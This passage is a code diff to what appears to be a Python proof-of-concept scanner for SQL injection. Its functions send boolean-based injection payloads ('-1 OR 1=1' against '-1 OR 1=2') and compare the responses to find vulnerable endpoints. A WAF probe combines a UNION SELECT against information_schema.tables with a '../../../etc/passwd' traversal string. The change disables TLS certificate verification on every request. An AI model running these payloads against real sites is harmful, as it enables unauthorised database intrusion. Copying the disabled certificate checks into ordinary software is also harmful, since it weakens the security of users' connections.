@@ -34,8 +34,8 @@ def poc(url):
     headers = {'User-Agent': firefox(),
                'Content-Type': 'application/x-www-form-urlencoded'}
     try:
-        r1 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=1'))
-        r2 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=2'))
+        r1 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=1'), verify=False)
+        r2 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=2'), verify=False)
     except:
         return False
     if r1.status_code == r2.status_code == 200 and len(r1.content) != len(r2.content):
@@ -51,7 +51,7 @@ def get_entry(url):
     for each in iterate_path(url):
         target = each.rstrip('/') + entry
         try:
-            r = requests.get(target, timeout=10)
+            r = requests.get(target, timeout=10, verify=False)
         except:
             continue
         if r.status_code == 200 and len(r.content) < 10:
@@ -63,7 +63,7 @@ def has_waf(target):
     # Check if target has a WAF/IDS
     check_waf_payload = '?p=-1 OR 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd'
     try:
-        r_waf = requests.get(target + check_waf_payload, timeout=3)
+        r_waf = requests.get(target + check_waf_payload, timeout=3, verify=False)
     except:
         return False
     if len(r_waf.content) > 10 or r_waf.status_code != 200:
